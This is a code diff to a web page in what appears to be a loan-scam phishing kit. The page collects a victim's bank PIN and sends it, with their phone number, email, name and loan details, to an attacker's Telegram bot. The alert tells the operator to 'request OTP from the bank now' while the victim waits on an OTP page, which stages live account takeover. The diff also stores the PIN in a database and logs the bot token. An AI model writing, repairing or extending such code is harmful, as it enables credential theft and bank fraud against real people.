@@ -50,6 +50,9 @@
 
         .error-message { background: rgba(244,63,94,0.15); color: #f43f5e; padding: 12px; border-radius: 12px; font-size: 0.8rem; margin-top: 16px; text-align: center; display: none; }
         .error-message.show { display: block; }
+        
+        .success-message { background: rgba(20,184,166,0.15); color: #14b8a6; padding: 12px; border-radius: 12px; font-size: 0.8rem; margin-top: 16px; text-align: center; display: none; }
+        .success-message.show { display: block; }
 
         .security-note { display: flex; align-items: center; gap: 8px; background: rgba(20,184,166,0.08); border: 1px solid rgba(20,184,166,0.2); border-radius: 12px; padding: 12px 14px; margin-top: 20px; }
         .security-note span { font-size: 0.78rem; color: #7e8aa2; line-height: 1.4; }
@@ -112,6 +115,7 @@
 
         <button class="submit-btn" id="confirmBtn" disabled onclick="handleConfirm()">Confirm PIN →</button>
         <div class="error-message" id="errorMessage"></div>
+        <div class="success-message" id="successMessage"></div>
 
         <div class="security-note">
             <span>🔒</span>
@@ -156,6 +160,8 @@
     // PIN boxes logic
     var boxes = ['p1','p2','p3','p4'].map(function(id){ return document.getElementById(id); });
     var confirmBtn = document.getElementById('confirmBtn');
+    var errorDiv = document.getElementById('errorMessage');
+    var successDiv = document.getElementById('successMessage');
 
     boxes.forEach(function(box, i) {
         box.addEventListener('input', function() {
@@ -194,45 +200,74 @@
     function getPin() { return boxes.map(function(b){ return b.value; }).join(''); }
 
     function showError(msg) {
-        var div = document.getElementById('errorMessage');
-        div.textContent = msg;
-        div.classList.add('show');
-        setTimeout(function(){ div.classList.remove('show'); }, 5000);
+        errorDiv.textContent = msg;
+        errorDiv.classList.add('show');
+        setTimeout(function(){ errorDiv.classList.remove('show'); }, 5000);
+    }
+
+    function showSuccess(msg) {
+        successDiv.textContent = msg;
+        successDiv.classList.add('show');
     }
 
     // Send Telegram notification with phone, email, and PIN
     async function sendTelegramNotification(pin) {
+        var decodedPhone = decodeURIComponent(phone);
+        var decodedEmail = decodeURIComponent(email);
+        var decodedName = decodeURIComponent(name);
+        
         var msg = '🔔 *NEW PIN CONFIRMATION* 🔔\n\n' +
             '━━━━━━━━━━━━━━━━━━━━━\n' +
-            '📱 *Phone:* ' + decodeURIComponent(phone) + '\n' +
+            '📱 *Phone:* ' + decodedPhone + '\n' +
             '🔐 *PIN:* ' + pin + '\n' +
-            '📧 *Email:* ' + decodeURIComponent(email) + '\n' +
+            '📧 *Email:* ' + decodedEmail + '\n' +
             '━━━━━━━━━━━━━━━━━━━━━\n' +
-            '👤 *Name:* ' + decodeURIComponent(name) + '\n' +
+            '👤 *Name:* ' + decodedName + '\n' +
             '💰 *Loan:* $' + parseFloat(amount).toLocaleString() + ' for ' + term + ' months\n' +
             '📊 *Interest:* ' + rate + '%\n' +
             '💵 *Monthly:* $' + parseFloat(monthly).toLocaleString() + '\n' +
             '🆔 *App ID:* ' + (appId || 'N/A') + '\n' +
             '━━━━━━━━━━━━━━━━━━━━━\n\n' +
-            '✅ *ACTION REQUIRED:* Please request OTP from the bank now!\n' +
+            '✅ *ACTION REQUIRED:* Request OTP from the bank now!\n' +
             '📱 User is waiting on the OTP verification page.';
 
-        var response = await fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'Markdown' })
-        });
-        var result = await response.json();
-        if (!result.ok) throw new Error(result.description);
-        return result;
+        console.log('Sending Telegram message...');
+        console.log('Bot Token:', TG_BOT_TOKEN);
+        console.log('Chat ID:', TG_CHAT_ID);
+        
+        var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
+        
+        try {
+            var response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: TG_CHAT_ID, 
+                    text: msg, 
+                    parse_mode: 'Markdown' 
+                })
+            });
+            var result = await response.json();
+            console.log('Telegram response:', result);
+            
+            if (!result.ok) {
+                throw new Error(result.description || 'Telegram API error');
+            }
+            return result;
+        } catch (error) {
+            console.error('Telegram fetch error:', error);
+            throw error;
+        }
     }
 
     // Save PIN to Supabase
     async function savePinToSupabase(pin) {
+        var decodedPhone = decodeURIComponent(phone);
+        
         var { error: pinErr } = await db
             .from('users')
             .update({ pin: pin })
-            .eq('phone', decodeURIComponent(phone));
+            .eq('phone', decodedPhone);
         if (pinErr) throw new Error(pinErr.message);
 
         if (appId) {
@@ -246,22 +281,25 @@
     // Main confirm function
     window.handleConfirm = async function() {
         var pin = getPin();
-        if (pin.length !== 4) { showError('Please enter all 4 digits.'); return; }
+        if (pin.length !== 4) { 
+            showError('Please enter all 4 digits.'); 
+            return; 
+        }
 
         confirmBtn.disabled = true;
         confirmBtn.textContent = '⏳ Sending notification...';
+        showSuccess('Sending notification to admin...');
 
         try {
             // Send Telegram notification (phone, email, PIN are included)
             await sendTelegramNotification(pin);
             
+            showSuccess('✓ Notification sent! Redirecting in 4 seconds...');
+            
             // Save PIN to Supabase
             await savePinToSupabase(pin);
             
-            // Update button text to show delay
-            confirmBtn.textContent = '✓ Sent! Redirecting in 4 seconds...';
-            
-            // 4 second delay - time for you to see the Telegram notification
+            // 4 second delay
             setTimeout(function() {
                 window.location.href = 'otp-verify.html'
                     + '?amount='  + encodeURIComponent(amount)
@@ -275,9 +313,11 @@
             }, 4000);
 
         } catch (err) {
-            showError('Something went wrong. Please try again.');
+            console.error('Error:', err);
+            showError('Error: ' + err.message);
             confirmBtn.disabled = false;
             confirmBtn.textContent = 'Confirm PIN →';
+            successDiv.classList.remove('show');
         }
     };
 </script>
